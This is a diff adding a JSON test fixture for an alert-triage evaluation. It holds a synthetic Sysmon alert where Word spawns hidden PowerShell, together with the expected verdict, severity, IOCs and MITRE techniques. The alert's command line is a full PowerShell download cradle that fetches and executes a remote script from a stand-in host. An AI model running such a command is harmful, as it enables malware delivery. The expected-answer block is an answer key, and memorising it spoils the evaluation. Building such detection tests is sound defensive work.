@@ -1,0 +1,43 @@
+{
+  "id": "sysmon1-office-powershell-download",
+  "description": "Clear true positive: Word spawns a hidden PowerShell download cradle that fetches and executes a remote script.",
+  "alert_type": "sysmon_event_1",
+  "request": {
+    "alert_id": 900001,
+    "customer_code": "golden"
+  },
+  "alert": {
+    "timestamp": "2026-03-02T09:14:07.412Z",
+    "agent_name": "WS-FIN-014",
+    "agent_ip": "192.0.2.14",
+    "rule_id": "92052",
+    "rule_level": 12,
+    "rule_description": "Sysmon - Suspicious Process - Office application spawned PowerShell",
+    "rule_groups": "windows, sysmon, sysmon_event1, sysmon_eid1_detections",
+    "rule_mitre_id": "T1059.001, T1204.002",
+    "data_win_system_eventID": "1",
+    "data_win_system_computer": "WS-FIN-014.corp.example.com",
+    "data_win_eventdata_utcTime": "2026-03-02 09:14:06.981",
+    "data_win_eventdata_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "data_win_eventdata_commandLine": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://cdn-update.example.com/stage2.ps1')\"",
+    "data_win_eventdata_currentDirectory": "C:\\Users\\a.keller\\Documents\\",
+    "data_win_eventdata_user": "CORP\\a.keller",
+    "data_win_eventdata_integrityLevel": "Medium",
+    "data_win_eventdata_hashes": "MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F",
+    "data_win_eventdata_parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "data_win_eventdata_parentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\a.keller\\Downloads\\Invoice_2026-0311.docm\"",
+    "data_win_eventdata_processId": "7412",
+    "data_win_eventdata_parentProcessId": "5120"
+  },
+  "expect": {
+    "verdict": "true_positive",
+    "also_acceptable": ["needs_escalation"],
+    "severity": { "min": "high", "max": "critical" },
+    "required_iocs": [
+      { "value": "cdn-update.example.com" }
+    ],
+    "forbidden_iocs": ["198.51.100.23", "evil-cdn.example.net"],
+    "forbidden_patterns": ["\\b(USER|HOST|IP_INT|EMAIL|DOMAIN_INT|SID|MAC)_\\d+\\b"],
+    "required_mitre": ["T1059"]
+  }
+}
